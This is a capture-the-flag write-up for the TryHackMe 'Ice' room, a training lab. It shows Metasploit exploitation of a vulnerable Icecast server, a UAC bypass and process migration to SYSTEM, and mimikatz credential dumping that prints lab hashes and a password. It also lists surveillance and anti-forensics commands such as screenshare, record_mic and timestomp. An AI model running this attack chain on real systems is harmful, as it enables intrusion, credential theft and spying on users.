# CTF Writeup: TryHackMe - Ice

## Challenge Description

Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

https://tryhackme.com/room/ice

## Solution

### Reconnaissance

Let's begin by conducting a scan of the machine to identify any open ports. We then notice Icecast is running on port 8000, RDP on port 3389 and the hostname of the machine is DARK-PC.

```
$ nmap -sC -sV 10.10.58.222
...
Not shown: 988 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2023-01-28T15:22:55
|_Not valid after:  2023-07-30T15:22:55
|_ssl-date: 2023-01-29T15:27:23+00:00; 0s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http          Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:E5:43:F5:04:E1 (Unknown)
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:e5:43:f5:04:e1 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-29T09:27:23-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-29 15:27:23
|_  start_date: 2023-01-29 15:22:54

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.17 seconds
```

### Gain Access

This machine is using a vulnerable version of Icecast which is a streaming media server.

1. What type of vulnerability does Icecast us? https://www.cvedetails.com/cve/CVE-2004-1561/
> Execute Code Overflow

2. What is the CVE number for this vulnerability?
> CVE-2004-1561
> An exploit can be found on exploit-db here: https://www.exploit-db.com/exploits/568


Using msfconsole for exploitation
```
$ msfconsole
msf5 > search icecast
Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite

msf5 > use 0
msf5 exploit(windows/http/icecast_header) > run RHOSTS=10.10.58.222
...
meterpreter >
```

3. What is the full path (starting with exploit) for the exploitation module?
> exploit/windows/http/icecast_header

4. What is the only required setting which currently is blank?
> rhosts

### Escalating Privileges

Proceding with the previous meterpreter, let's escalate privileges.

```
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.58.222 - Collecting local exploits for x86/windows...
[*] 10.10.58.222 - 34 exploit checks are being tried...
[+] 10.10.58.222 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.58.222 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.58.222 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.58.222 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.58.222 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.58.222 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.58.222 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.58.222 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.58.222 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable

meterpreter > getuid
Server username: Dark-PC\Dark

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > background
[*] Backgrounding session 1...

msf5 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
msf5 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
msf5 exploit(windows/local/bypassuac_eventvwr) > run

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
...
SeTakeOwnershipPrivilege
...
meterpreter >

```

1. What's the name of the shell we have now?
> meterpreter

2. What user was running that Icecast process?
> Dark

3. What build of Windows is the system?
> 7601

4. What is the architecture of the process we're running?
> x64

5. What is the full path (starting with exploit/) for the first returned exploit?
> exploit/windows/local/bypassuac_eventvwr

6. What permission listed allows us to take ownership of files?
> SeTakeOwnershipPrivilege

## Looting

Learn how to gather additional credentials and crack the saved hashes on the machine.

Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows.

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 ...
 1268  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe

```
1. In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?
> spoolsv.exe

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 

```
meterpreter > getuid
Server username: Dark-PC\Dark

meterpreter > migrate -N spoolsv.exe
[*] Migrating from 1044 to 1268...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

2. Let's check what user we are now with the command `getuid`. What user is listed?
> NT AUTHORITY\SYSTEM

Let's load Mimikatz using `load kiwi`
```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > help
...
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

meterpreter > creds_all
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)

```

3. Which command allows up to retrieve all credentials?
> creds_all

4. What is Dark's password?
> Password01


## Post-Exploitation

Explore post-exploitation actions we can take on Windows.

```
meterpreter > help

Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    screenshare    Watch the remote user's desktop in real time


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    ...

Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes


Kiwi Commands
=============

    Command                Description
    -------                -----------
    ...
    golden_ticket_create   Create a golden kerberos ticket
    ...
```

1. What command allows us to dump all of the password hashes stored on the system?
> hashdump

2. What command allows us to watch the remote user's desktop in real time?
> screenshare

3. How about if we wanted to record from a microphone attached to the system?
> record_mic

4. What command allows us to modify timestamps of files on the system
> timestomp

5. Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?
> golden_ticket_create